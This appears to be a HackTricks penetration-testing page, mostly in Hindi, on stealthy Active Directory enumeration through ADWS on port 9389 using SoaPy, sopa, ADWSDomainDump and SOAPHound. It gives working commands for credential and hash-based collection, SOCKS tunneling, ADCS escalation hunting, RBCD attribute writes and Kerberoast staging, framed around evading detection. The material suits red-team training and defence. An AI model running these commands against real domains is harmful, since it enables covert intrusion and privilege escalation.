# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS क्या है?

Active Directory Web Services (ADWS) **हर Domain Controller पर डिफ़ॉल्ट रूप से सक्षम है (Windows Server 2008 R2 से)** और TCP **9389** पर सुनता है। नाम के बावजूद, **कोई HTTP शामिल नहीं है**। इसके बजाय, यह सेवा LDAP-स्टाइल डेटा को एक मालिकाना .NET फ्रेमिंग प्रोटोकॉल स्टैक के माध्यम से एक्सपोज़ करती है:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

क्योंकि ट्रैफ़िक इन बाइनरी SOAP फ्रेम्स के अंदर कैप्सुलेट होता है और एक अनौपचारिक पोर्ट पर जाता है, **ADWS के माध्यम से एन्यूमरेशन क्लासिक LDAP/389 & 636 ट्रैफ़िक की तुलना में बहुत कम संभावना से इंस्पेक्ट, फ़िल्टर या सिग्नेचर-आधारित होगा**। ऑपरेटर्स के लिए इसका मतलब है:

* अधिक स्लिक recon – Blue teams अक्सर LDAP क्वेरीज पर ध्यान केंद्रित करते हैं।
* SOCKS proxy के माध्यम से 9389/TCP टनल करके **non-Windows hosts (Linux, macOS)** से कलेक्ट करने की स्वतंत्रता।
* वही डेटा जो आप LDAP से प्राप्त करते (users, groups, ACLs, schema, इत्यादि) और लिखने की क्षमता भी (उदाहरण के लिए `msDs-AllowedToActOnBehalfOfOtherIdentity` के लिए **RBCD**)।

ADWS इंटरैक्शन्स WS-Enumeration पर इम्प्लीमेंटेड हैं: हर क्वेरी एक `Enumerate` संदेश से शुरू होती है जो LDAP फ़िल्टर/एट्रिब्यूट्स को परिभाषित करती है और एक `EnumerationContext` GUID लौटाती है, इसके बाद एक या अधिक `Pull` संदेश होते हैं जो सर्वर-परिभाषित रिजल्ट विंडो तक स्ट्रीम करते हैं। Contexts ~30 मिनट के बाद एक्सपायर हो जाते हैं, इसलिए टूलिंग को या तो परिणाम पेज करना होगा या state खोने से बचने के लिए फ़िल्टर विभाजित करने होंगे (प्रति CN प्रिफिक्स क्वेरी)। जब security descriptors पूछ रहे हों, तो SACLs को छोड़ने के लिए `LDAP_SERVER_SD_FLAGS_OID` कंट्रोल निर्दिष्ट करें, वरना ADWS अपने SOAP उत्तर से `nTSecurityDescriptor` एट्रिब्यूट को बस ड्रॉप कर देता है।

> NOTE: ADWS का उपयोग कई RSAT GUI/PowerShell टूल्स द्वारा भी किया जाता है, इसलिए ट्रैफ़िक वैध admin गतिविधि के साथ ब्लेंड भी हो सकता है।

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) एक **pure Python में ADWS प्रोटोकॉल स्टैक का पूर्ण री-इम्प्लीमेंटेशन** है। यह NBFX/NBFSE/NNS/NMF फ्रेम्स को बाइट-फॉर-बाइट काफ्ट करता है, जिससे Unix-लाइक सिस्टम्स से .NET runtime को छुए बिना कलेक्शन संभव होता है।

### Key Features

* **SOCKS** के माध्यम से proxying का समर्थन (C2 implants से उपयोगी)।
* LDAP `-q '(objectClass=user)'` के समान सूक्ष्म खोज फ़िल्टर।
* वैकल्पिक **write** ऑपरेशन्स (`--set` / `--delete`)।
* BloodHound में डायरेक्ट ingestion के लिए **BOFHound output mode**।
* मानव पठनीयता के लिए timestamps / `userAccountControl` को सुंदर करने का `--parse` फ़्लैग।

### Targeted collection flags & write operations

SoaPy उन curated switches के साथ आता है जो ADWS पर सबसे सामान्य LDAP hunting टास्क्स को दोहराते हैं: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, साथ ही कस्टम पुल्स के लिए raw `--query` / `--filter` नॉब्स। इन्हें write primitives के साथ जोड़ें जैसे `--rbcd <source>` (सेट करता है `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (targeted Kerberoasting के लिए SPN staging) और `--asrep` (`userAccountControl` में `DONT_REQ_PREAUTH` को flip करना)।

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
उसी होस्ट/क्रेडेंशियल्स का उपयोग करके तुरंत findings को weaponise करें: RBCD-capable ऑब्जेक्ट्स को `--rbcds` के साथ dump करें, फिर एक Resource-Based Constrained Delegation chain को stage करने के लिए `--rbcd 'WEBSRV01$' --account 'FILE01$'` लागू करें (पूर्ण दुरुपयोग पथ के लिए देखें [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### इंस्टॉलेशन (ऑपरेटर होस्ट)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* `ldapdomaindump` का fork जो LDAP queries को ADWS calls में TCP/9389 पर बदलता है ताकि LDAP-signature hits कम हों।
* प्रारंभिक reachability जांच 9389 पर करता है जब तक कि `--force` पास न किया गया हो (यदि port scans noisy/filtered हों तो probe को स्किप करता है)।
* Microsoft Defender for Endpoint और CrowdStrike Falcon के खिलाफ README में successful bypass के साथ परखा गया।

### स्थापना
```bash
pipx install .
```
### उपयोग
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
सामान्य आउटपुट 9389 reachability check, ADWS bind, और dump start/finish को लॉग करता है:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - A practical client for ADWS in Golang

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **ऑब्जेक्ट खोज और पुनःप्राप्ति** - `query` / `get`
* **ऑब्जेक्ट लाइफसाइकल** - `create [user|computer|group|ou|container|custom]` and `delete`
* **एट्रिब्यूट एडिटिंग** - `attr [add|replace|delete]`
* **अकाउंट मैनेजमेंट** - `set-password` / `change-password`
* और अन्य जैसे `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, आदि।

### Protocol mapping highlights

* LDAP-style खोजें **WS-Enumeration** (`Enumerate` + `Pull`) के माध्यम से की जाती हैं, जिनमें attribute projection, scope control (Base/OneLevel/Subtree) और pagination शामिल हैं।
* सिंगल-ऑब्जेक्ट प्राप्ति में **WS-Transfer** `Get` का उपयोग होता है; attribute परिवर्तनों के लिए `Put`; हटाने के लिए `Delete`।
* बिल्ट-इन ऑब्जेक्ट क्रिएशन **WS-Transfer ResourceFactory** का उपयोग करता है; कस्टम ऑब्जेक्ट्स के लिए YAML टेम्पलेट्स द्वारा संचालित **IMDA AddRequest** का उपयोग होता है।
* पासवर्ड ऑपरेशन्स **MS-ADCAP** एक्शन्स हैं (`SetPassword`, `ChangePassword`)।

### Unauthenticated metadata discovery (mex)

ADWS बिना क्रेडेंशियल्स के WS-MetadataExchange एक्सपोज़ करता है, जो ऑथेंटिकेट करने से पहले एक्सपोज़र को वैलिडेट करने का एक तेज़ तरीका है:
```bash
sopa mex --dc <DC>
```
### DNS/DC खोज और Kerberos लक्षित करने के नोट्स

Sopa SRV के माध्यम से DCs को रिज़ॉल्व कर सकता है अगर `--dc` छोड़ा गया है और `--domain` दिया गया है। यह इस क्रम में क्वेरी करता है और उच्च-प्राथमिकता वाले लक्ष्य का उपयोग करता है:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
ऑपरेशनल रूप से, विभाजित वातावरणों में असफलताओं से बचने के लिए DC-नियंत्रित resolver को प्राथमिकता दें:

* Use `--dns <DC-IP>` so **सभी** SRV/PTR/forward लुकअप DC DNS के माध्यम से जाएँ।
* Use `--dns-tcp` when UDP is blocked or SRV answers are large.
* If Kerberos is enabled and `--dc` is an IP, sopa performs a **reverse PTR** to obtain an FQDN for correct SPN/KDC targeting. If Kerberos is not used, no PTR lookup happens.

Example (IP + Kerberos, forced DNS via the DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### प्रमाणीकरण सामग्री विकल्प

सादा-पाठ पासवर्ड के अलावा, sopa ADWS auth के लिए **NT hashes**, **Kerberos AES keys**, **ccache**, और **PKINIT certificates** (PFX or PEM) का समर्थन करता है। Kerberos तब निहित माना जाता है जब `--aes-key`, `-c` (ccache) या सर्टिफिकेट-आधारित विकल्पों का उपयोग किया जाए।
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### टेम्पलेट्स के जरिए कस्टम ऑब्जेक्ट बनाना

किसी भी ऑब्जेक्ट क्लास के लिए, `create custom` कमांड एक YAML टेम्पलेट लेता है जो IMDA `AddRequest` से मैप होता है:

* `parentDN` और `rdn` कंटेनर और रिलेटिव DN को परिभाषित करते हैं।
* `attributes[].name` `cn` या namespaced `addata:cn` को समर्थन करता है।
* `attributes[].type` `string|int|bool|base64|hex` या explicit `xsd:*` स्वीकार करता है।
* कृपया **नहीं** शामिल करें `ad:relativeDistinguishedName` या `ad:container-hierarchy-parent`; sopa इन्हें इंजेक्ट करता है।
* `hex` मान `xsd:base64Binary` में कन्वर्ट किए जाते हैं; खाली स्ट्रिंग सेट करने के लिए `value: ""` का उपयोग करें।

## SOAPHound – हाई-वॉल्यूम ADWS संग्रह (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) एक .NET कलेक्टर है जो सभी LDAP इंटरैक्शन को ADWS के अंदर रखता है और BloodHound v4-समर्थित JSON उत्पन्न करता है। यह एक बार `objectSid`, `objectGUID`, `distinguishedName` और `objectClass` का पूरा कैश बनाता है (`--buildcache`), फिर इसे हाई-वॉल्यूम `--bhdump`, `--certdump` (ADCS), या `--dnsdump` (AD-integrated DNS) पासों के लिए पुन: उपयोग करता है ताकि केवल ~35 महत्वपूर्ण एट्रिब्यूट्स कभी DC से बाहर जाएँ। AutoSplit (`--autosplit --threshold <N>`) स्वचालित रूप से CN प्रीफ़िक्स के आधार पर क्वेरीज को शार्ड करता है ताकि बड़े फॉरेस्ट्स में 30-मिनट EnumerationContext timeout के अंतर्गत रहे।

डोमेन-जोइन किए गए ऑपरेटर VM पर सामान्य वर्कफ़्लो:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exported JSON स्लॉट्स को सीधे SharpHound/BloodHound workflows में निर्यात किया गया—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit SOAPHound को multi-million object forests पर अधिक टिकाऊ बनाता है जबकि क्वेरी की संख्या ADExplorer-style snapshots से कम रखता है।

## स्टेल्थ AD संग्रह वर्कफ़्लो

निम्नलिखित वर्कफ़्लो दिखाता है कि कैसे ADWS के माध्यम से **domain & ADCS objects** को enumerate किया जाए, उन्हें BloodHound JSON में convert किया जाए और certificate-based attack paths के लिए hunt किया जाए – सभी Linux से:

1. **Tunnel 9389/TCP** को लक्ष्य नेटवर्क से अपनी मशीन तक बनाएँ (e.g. via Chisel, Meterpreter, SSH dynamic port-forward, etc.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` या SoaPy के `--proxyHost/--proxyPort` का उपयोग करें।

2. **रूट डोमेन ऑब्जेक्ट एकत्र करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **ADCS-संबंधित ऑब्जेक्ट्स को Configuration NC से एकत्र करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound में रूपांतरित करें:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP अपलोड करें** BloodHound GUI में और `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` जैसी cypher queries चलाएँ ताकि certificate escalation paths (ESC1, ESC8, आदि) प्रकट हों।

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD) लिखना
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
इसे `s4u2proxy`/`Rubeus /getticket` के साथ जोड़ें ताकि एक पूर्ण **Resource-Based Constrained Delegation** श्रृंखला बन सके (देखें [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## टूल सारांश

| उद्देश्य | टूल | नोट्स |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch लॉग्स को कन्वर्ट करता है |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | इसी SOCKS के माध्यम से प्रॉक्सी किया जा सकता है |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | known ADWS endpoints के साथ इंटरफ़ेस करने के लिए एक Generic client - enumeration, object creation, attribute modifications, और password changes की अनुमति देता है |

## संदर्भ

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
